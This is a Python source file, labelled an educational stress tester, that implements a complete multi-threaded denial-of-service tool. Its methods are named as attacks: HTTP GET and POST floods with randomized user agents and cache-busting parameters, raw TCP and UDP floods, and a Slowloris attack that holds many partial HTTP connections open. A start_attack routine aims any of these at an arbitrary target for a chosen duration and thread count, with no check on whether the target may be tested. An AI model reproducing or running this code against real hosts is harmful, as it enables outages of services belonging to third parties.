#!/usr/bin/env python3
"""
Simple Stress Tester - Core Module
Original code for educational stress testing
Author: Custom Implementation
"""

import socket
import threading
import time
import random
import string
from urllib.parse import urlparse
import requests

class StressTester:
    """Core stress testing class"""
    
    def __init__(self):
        self.running = False
        self.threads = []
        self.request_count = 0
        self.error_count = 0
        self.start_time = None
        
    def generate_random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_random_user_agent(self):
        """Get random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        return random.choice(agents)
    
    def http_get_flood(self, url, duration):
        """HTTP GET flood attack"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Cache-Control': 'no-cache',
                    'Accept': 'text/html,application/xhtml+xml',
                    'Connection': 'keep-alive'
                }
                
                # Add random parameter to bypass cache
                random_param = f"?rand={self.generate_random_string()}"
                full_url = url + random_param
                
                response = requests.get(full_url, headers=headers, timeout=5)
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.1)
    
    def http_post_flood(self, url, duration):
        """HTTP POST flood attack"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                headers = {
                    'User-Agent': self.get_random_user_agent(),
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Connection': 'keep-alive'
                }
                
                # Random POST data
                data = {
                    'data': self.generate_random_string(100),
                    'rand': self.generate_random_string(20)
                }
                
                response = requests.post(url, headers=headers, data=data, timeout=5)
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.1)
    
    def tcp_flood(self, host, port, duration):
        """TCP flood attack"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((host, port))
                
                # Send random data
                data = self.generate_random_string(1024).encode()
                sock.send(data)
                
                sock.close()
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.1)
    
    def udp_flood(self, host, port, duration):
        """UDP flood attack"""
        end_time = time.time() + duration
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Send random UDP packets
                data = self.generate_random_string(1024).encode()
                sock.sendto(data, (host, port))
                
                sock.close()
                self.request_count += 1
                
            except Exception as e:
                self.error_count += 1
                time.sleep(0.1)
    
    def slowloris_attack(self, host, port, duration):
        """Slowloris attack - slow HTTP requests"""
        end_time = time.time() + duration
        sockets = []
        
        # Create initial connections
        for _ in range(100):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((host, port))
                
                # Send partial HTTP request
                sock.send(f"GET /?{self.generate_random_string()} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(f"User-Agent: {self.get_random_user_agent()}\r\n".encode())
                
                sockets.append(sock)
                self.request_count += 1
            except:
                pass
        
        # Keep connections alive
        while self.running and time.time() < end_time:
            try:
                for sock in sockets:
                    try:
                        sock.send(f"X-a: {self.generate_random_string()}\r\n".encode())
                    except:
                        sockets.remove(sock)
                
                time.sleep(10)
                
            except Exception as e:
                self.error_count += 1
        
        # Close all sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def start_attack(self, method, target, duration, thread_count):
        """Start stress test attack"""
        self.running = True
        self.request_count = 0
        self.error_count = 0
        self.start_time = time.time()
        self.threads = []
        
        # Parse target
        if method in ['GET', 'POST']:
            url = target
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            # For TCP/UDP, target should be host:port
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 80
        
        # Select attack method
        if method == 'GET':
            attack_func = lambda: self.http_get_flood(target, duration)
        elif method == 'POST':
            attack_func = lambda: self.http_post_flood(target, duration)
        elif method == 'TCP':
            attack_func = lambda: self.tcp_flood(host, port, duration)
        elif method == 'UDP':
            attack_func = lambda: self.udp_flood(host, port, duration)
        elif method == 'SLOW':
            attack_func = lambda: self.slowloris_attack(host, port, duration)
        else:
            raise ValueError(f"Unknown method: {method}")
        
        # Start threads
        for i in range(thread_count):
            thread = threading.Thread(target=attack_func)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        return {
            'status': 'started',
            'method': method,
            'target': target,
            'duration': duration,
            'threads': thread_count,
            'start_time': self.start_time
        }
    
    def stop_attack(self):
        """Stop attack"""
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=1)
        
        return {
            'status': 'stopped',
            'total_requests': self.request_count,
            'total_errors': self.error_count,
            'duration': time.time() - self.start_time if self.start_time else 0
        }
    
    def get_stats(self):
        """Get current statistics"""
        if not self.start_time:
            return {
                'status': 'idle',
                'requests': 0,
                'errors': 0,
                'duration': 0,
                'rps': 0
            }
        
        duration = time.time() - self.start_time
        rps = self.request_count / duration if duration > 0 else 0
        
        return {
            'status': 'running' if self.running else 'stopped',
            'requests': self.request_count,
            'errors': self.error_count,
            'duration': round(duration, 2),
            'rps': round(rps, 2),
            'active_threads': len([t for t in self.threads if t.is_alive()])
        }

